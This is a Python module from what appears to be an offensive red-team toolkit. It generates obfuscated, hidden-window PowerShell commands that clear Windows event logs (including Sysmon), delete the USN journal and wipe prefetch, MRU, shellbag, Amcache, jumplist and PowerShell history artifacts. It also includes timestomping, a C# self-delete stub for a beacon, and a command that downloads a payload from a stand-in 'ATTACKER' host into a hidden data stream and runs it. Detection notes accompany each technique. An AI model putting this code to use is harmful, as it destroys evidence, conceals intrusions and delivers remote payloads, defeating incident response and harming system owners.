"""
Post-engagement anti-forensics generator.

Produces commands that tamper with or wipe Windows forensic artifacts.
Distinct from /evasion: those bypass real-time detection during operations;
these clean up after the operation has occurred. Use only at engagement
teardown and only when explicitly in-scope.
"""
from dataclasses import dataclass, field

from .obfuscate import ps_tick_marks

SUPPORTED_TECHNIQUES = (
    "clear_event_logs",
    "disable_usn_journal",
    "clear_prefetch",
    "clear_recent_files",
    "clear_recycle_bin",
    "time_stomp",
    "ads_hide_payload",
    "self_delete",
    "clear_shellbags",
    "clear_amcache",
    "clear_jumplists",
    "clear_powershell_history",
)


@dataclass
class AntiForensicsResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── Techniques ────────────────────────────────────────────────────────────────

def _clear_event_logs(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "$logs=@('Security','System','Application',"
        "'Microsoft-Windows-PowerShell/Operational',"
        "'Windows PowerShell',"
        "'Microsoft-Windows-Sysmon/Operational',"
        "'Microsoft-Windows-TaskScheduler/Operational');"
        "foreach($l in $logs){"
        "wevtutil.exe cl \"$l\" 2>$null;"
        "Write-Output \"cleared: $l\""
        "}"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clear_event_logs",
        notes=(
            "Clears Security, System, Application, PowerShell, Sysmon, TaskScheduler "
            "logs. Requires SYSTEM. The act of clearing generates Event 1102 "
            "(Security log cleared) — the cleared-log notice is itself logged."
        ),
        techniques=["T1070.001"],
        risk="CRITICAL",
        detections=[
            "Event 1102 (Security log cleared) — high-fidelity blue-team alert",
            "Event 104 (System log cleared) on System channel",
            "EDR rule on wevtutil.exe cl with non-default channels",
        ],
    )


def _disable_usn_journal(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "fsutil.exe usn deletejournal /D C: ;"
        "fsutil.exe usn deletejournal /D D: 2>$null ;"
        "Write-Output 'USN journal deleted on C:'"
    )
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="disable_usn_journal",
        notes=(
            "Removes the USN change journal on C: (and D: if present). Defeats "
            "forensic tools that rebuild file activity from $UsnJrnl. Requires SYSTEM. "
            "Note: many EDRs replay USN at boot; this only removes existing entries."
        ),
        techniques=["T1070.004"],
        risk="HIGH",
        detections=[
            "fsutil.exe usn deletejournal in process command line (Sysmon Event 1)",
            "USN journal size drop to 0 (EDR file-system telemetry)",
            "Volume modification audit (Security Event 4663)",
        ],
    )


def _clear_prefetch(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "Remove-Item -Path 'C:\\Windows\\Prefetch\\*' -Recurse -Force -ErrorAction SilentlyContinue;"
        "# Disable Prefetch entirely (until next boot) so no new artifacts are produced.\n"
        "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters' "
        "-Name 'EnablePrefetcher' -Value 0 -Force;"
        "Write-Output 'prefetch cleared and disabled'"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clear_prefetch",
        notes=(
            "Wipes %SystemRoot%\\Prefetch and disables Prefetcher so no new "
            "execution traces accumulate. Requires Local Admin. "
            "Forensic tools (PECmd, WinPrefetchView) will return empty."
        ),
        techniques=["T1070.004"],
        risk="HIGH",
        detections=[
            "Mass deletion under C:\\Windows\\Prefetch (file-system EDR telemetry)",
            "Event 4657 on PrefetchParameters registry key",
            "Defender suspicious activity 'Prefetch directory wipe'",
        ],
    )


def _clear_recent_files(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "$paths=@(\n"
        "  \"$env:APPDATA\\Microsoft\\Windows\\Recent\",\n"
        "  \"$env:APPDATA\\Microsoft\\Office\\Recent\",\n"
        "  \"$env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations\",\n"
        "  \"$env:APPDATA\\Microsoft\\Windows\\Recent\\CustomDestinations\");\n"
        "foreach($p in $paths){\n"
        "  if(Test-Path $p){ Remove-Item -Path \"$p\\*\" -Recurse -Force -ErrorAction SilentlyContinue }\n"
        "}\n"
        "# Wipe per-application MRU registry entries:\n"
        "$mruKeys=@(\n"
        "  'HKCU:\\Software\\Microsoft\\Office\\*\\*\\File MRU',\n"
        "  'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs',\n"
        "  'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths',\n"
        "  'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU');\n"
        "foreach($k in $mruKeys){\n"
        "  Get-ChildItem -Path $k -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue\n"
        "}"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clear_recent_files",
        notes=(
            "Removes Recent/, Office MRU files (LNK + .automaticDestinations-ms), "
            "and RecentDocs / TypedPaths / RunMRU registry entries. No admin required — "
            "operates on the current user's profile."
        ),
        techniques=["T1070.004", "T1070.009"],
        risk="MEDIUM",
        detections=[
            "Mass file deletion under Microsoft\\Windows\\Recent",
            "Event 4657 on HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
            "Sysmon Event 13/14 on JumpList key writes",
        ],
    )


def _clear_recycle_bin(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "Get-PSDrive -PSProvider FileSystem | ForEach-Object {\n"
        "  $bin = Join-Path $_.Root '$Recycle.Bin'\n"
        "  if(Test-Path $bin){\n"
        "    Get-ChildItem -Path $bin -Force -ErrorAction SilentlyContinue |\n"
        "      ForEach-Object { Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue }\n"
        "  }\n"
        "}\n"
        "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clear_recycle_bin",
        notes=(
            "Empties $Recycle.Bin on every drive and runs Clear-RecycleBin. "
            "No admin needed for the current user's bin; SYSTEM needed for other "
            "users' bins."
        ),
        techniques=["T1070.004"],
        risk="LOW",
        detections=[
            "Mass deletion under $Recycle.Bin",
            "Clear-RecycleBin cmdlet in ScriptBlock log",
        ],
    )


def _time_stomp(target: str, obfuscate: bool) -> AntiForensicsResult:
    if target.lower() in ("", "auto"):
        target = "C:\\Windows\\Temp\\payload.exe"
    code = (
        f"$f='{target}';\n"
        "$ref='C:\\Windows\\System32\\kernel32.dll';\n"
        "(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime;\n"
        "(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime;\n"
        "(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime;\n"
        "Write-Output \"timestomped: $f\""
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="time_stomp",
        notes=(
            f"Copies kernel32.dll's three timestamps onto '{target}'. "
            "$MFT entries (FILE_NAME) still hold original timestamps — only $STANDARD_INFORMATION "
            "is affected. Forensic tools that read $MFT directly (MFTECmd) detect the mismatch."
        ),
        techniques=["T1070.006"],
        risk="MEDIUM",
        detections=[
            "Sysmon Event 2 (FileCreateTime changed)",
            "$STANDARD_INFORMATION timestamp earlier than $FILE_NAME timestamp (MFT anomaly)",
            "EDR file timeline showing impossible creation/write order",
        ],
    )


def _ads_hide_payload(target: str, obfuscate: bool) -> AntiForensicsResult:
    if target.lower() in ("", "auto"):
        target = "C:\\Windows\\Temp\\notes.txt"
    code = (
        f"$host_file='{target}';\n"
        "$payload_url='http://ATTACKER/payload.exe';\n"
        "# Hide payload bytes inside an Alternate Data Stream attached to the host file.\n"
        "(New-Object Net.WebClient).DownloadFile($payload_url, \"$host_file:hidden.exe\");\n"
        "# Launch the ADS payload — visible in Get-Item -Stream * but invisible in Explorer:\n"
        "Start-Process -FilePath \"wmic.exe\" -ArgumentList \"process call create $host_file:hidden.exe\""
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="ads_hide_payload",
        notes=(
            f"Stores payload in NTFS Alternate Data Stream attached to '{target}'. "
            "Invisible to Explorer / dir. Discoverable with `dir /R` or "
            "`Get-Item -Stream *`. Modern Defender flags ADS execution; older AVs miss it."
        ),
        techniques=["T1564.004"],
        risk="HIGH",
        detections=[
            "Sysmon Event 15 (FileCreateStreamHash) — high-fidelity ADS detection",
            "NTFS ADS write to non-binary host file",
            "Defender real-time scan of newly created stream",
        ],
    )


def _self_delete(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "// C# stub — operator embeds at end of beacon / dropper.\n"
        "// Uses SetFileInformationByHandle + FileDispositionInfo to mark the\n"
        "// currently-running executable for deletion. The file disappears the\n"
        "// instant the last handle (the running process's handle) closes.\n"
        "//\n"
        "// References: github.com/LloydLabs/delete-self-poc\n"
        "//\n"
        "using System;\n"
        "using System.Diagnostics;\n"
        "using System.IO;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class SelfDelete {\n"
        "    [DllImport(\"kernel32\")] static extern bool SetFileInformationByHandle(\n"
        "        IntPtr h, int fic, ref FILE_DISPOSITION_INFO info, int size);\n"
        "    [StructLayout(LayoutKind.Sequential)] public struct FILE_DISPOSITION_INFO {\n"
        "        public bool DeleteFile;\n"
        "    }\n"
        "    public static void DeleteSelf() {\n"
        "        var info = new FILE_DISPOSITION_INFO { DeleteFile = true };\n"
        "        var current = Process.GetCurrentProcess().MainModule.FileName;\n"
        "        var fs = File.Open(current, FileMode.Open, FileAccess.Read, FileShare.Delete);\n"
        "        SetFileInformationByHandle(fs.SafeFileHandle.DangerousGetHandle(),\n"
        "            4, ref info, Marshal.SizeOf(info));\n"
        "        // file is now marked for delete; runtime closes the handle at exit.\n"
        "    }\n"
        "}"
    )
    return AntiForensicsResult(
        command=code,
        technique="self_delete",
        notes=(
            "C# stub for self-deletion via FileDispositionInfo. Marks the running "
            "binary for deletion; the file disappears as soon as the process exits. "
            "Works on Windows 10 1607+. Defeats post-engagement static analysis. "
            "Operator embeds at end of beacon."
        ),
        techniques=["T1070.004"],
        risk="HIGH",
        detections=[
            "Sysmon Event 23 (FileDelete) of currently-executing binary",
            "EDR rule on SetFileInformationByHandle with FileDispositionInfo class",
            "Process exit immediately followed by file disappearance",
        ],
    )


def _clear_shellbags(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "$keys=@(\n"
        "  'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags',\n"
        "  'HKCU:\\Software\\Microsoft\\Windows\\Shell\\BagMRU',\n"
        "  'HKCU:\\Software\\Microsoft\\Windows\\ShellNoRoam\\Bags',\n"
        "  'HKCU:\\Software\\Microsoft\\Windows\\ShellNoRoam\\BagMRU',\n"
        "  'HKCU:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\Bags',\n"
        "  'HKCU:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU');\n"
        "foreach($k in $keys){\n"
        "  if(Test-Path $k){ Remove-Item -Path $k -Recurse -Force -ErrorAction SilentlyContinue }\n"
        "}"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clear_shellbags",
        notes=(
            "Removes ShellBag registry trees that record which folders the user has "
            "browsed. Defeats ShellBags Explorer / RegRipper timeline reconstruction. "
            "No admin needed — current user only."
        ),
        techniques=["T1070.004"],
        risk="MEDIUM",
        detections=[
            "Event 4657 on HKCU\\Software\\Microsoft\\Windows\\Shell\\BagMRU",
            "Mass registry key deletion in user hive (Sysmon Event 12)",
        ],
    )


def _clear_amcache(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "$amcache='C:\\Windows\\AppCompat\\Programs\\Amcache.hve';\n"
        "# Amcache is loaded by NT — we can't delete it while running. Truncate via\n"
        "# loading the hive into a temporary key, deleting entries, then unloading.\n"
        "# Operator runs as SYSTEM. The simplest opsec move is to *stop* updates\n"
        "# rather than clear history: disable the Program Compatibility Assistant\n"
        "# service so new amcache entries aren't created.\n"
        "sc.exe config 'PcaSvc' start= disabled 2>$null;\n"
        "sc.exe stop 'PcaSvc' 2>$null;\n"
        "# Optional: rename existing Amcache.hve so a fresh empty one is generated.\n"
        "Rename-Item -Path $amcache -NewName 'Amcache.hve.old' -Force -ErrorAction SilentlyContinue"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clear_amcache",
        notes=(
            "Amcache.hve cannot be safely written while running. We disable the "
            "Program Compatibility Assistant service so new entries stop accumulating, "
            "then rename the existing hive. Requires SYSTEM. AmcacheParser will return "
            "empty on next forensic pass."
        ),
        techniques=["T1070.004"],
        risk="HIGH",
        detections=[
            "sc.exe config PcaSvc start= disabled (rare in normal use)",
            "Amcache.hve file rename or delete (Sysmon Event 11/23)",
            "Microsoft-Windows-PCA log gap after service stop",
        ],
    )


def _clear_jumplists(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "$paths=@(\n"
        "  \"$env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations\",\n"
        "  \"$env:APPDATA\\Microsoft\\Windows\\Recent\\CustomDestinations\");\n"
        "foreach($p in $paths){\n"
        "  if(Test-Path $p){\n"
        "    Get-ChildItem -Path $p -Force -ErrorAction SilentlyContinue | "
        "Remove-Item -Force -ErrorAction SilentlyContinue\n"
        "  }\n"
        "}"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clear_jumplists",
        notes=(
            "Removes per-application JumpList files (.automaticDestinations-ms / "
            ".customDestinations-ms). JumpListExplorer / JLECmd will return empty. "
            "No admin — current user only."
        ),
        techniques=["T1070.004"],
        risk="MEDIUM",
        detections=[
            "Mass deletion under Recent\\AutomaticDestinations (Sysmon Event 23)",
            "Defender real-time scan of jumplist directory",
        ],
    )


def _clear_powershell_history(target: str, obfuscate: bool) -> AntiForensicsResult:
    code = (
        "$hist=\"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\";\n"
        "if(Test-Path $hist){ Remove-Item -Path $hist -Force -ErrorAction SilentlyContinue };\n"
        "# Also disable history saving for the current session.\n"
        "Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue;\n"
        "# Clear current session command history:\n"
        "Clear-History"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return AntiForensicsResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clear_powershell_history",
        notes=(
            "Deletes PSReadLine history file and disables history-save for the "
            "current session. Defeats incident-responder workflows that pull "
            "ConsoleHost_history.txt as a first-look forensic artifact."
        ),
        techniques=["T1070.003"],
        risk="MEDIUM",
        detections=[
            "Deletion of ConsoleHost_history.txt (Sysmon Event 23)",
            "Set-PSReadlineOption -HistorySaveStyle SaveNothing in ScriptBlock log",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "clear_event_logs": _clear_event_logs,
    "disable_usn_journal": _disable_usn_journal,
    "clear_prefetch": _clear_prefetch,
    "clear_recent_files": _clear_recent_files,
    "clear_recycle_bin": _clear_recycle_bin,
    "time_stomp": _time_stomp,
    "ads_hide_payload": _ads_hide_payload,
    "self_delete": _self_delete,
    "clear_shellbags": _clear_shellbags,
    "clear_amcache": _clear_amcache,
    "clear_jumplists": _clear_jumplists,
    "clear_powershell_history": _clear_powershell_history,
}


def generate_anti_forensics(
    technique: str,
    target: str = "auto",
    obfuscate: bool = True,
) -> AntiForensicsResult:
    if technique not in _DISPATCH:
        raise ValueError(
            f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}"
        )
    return _DISPATCH[technique](target, obfuscate)
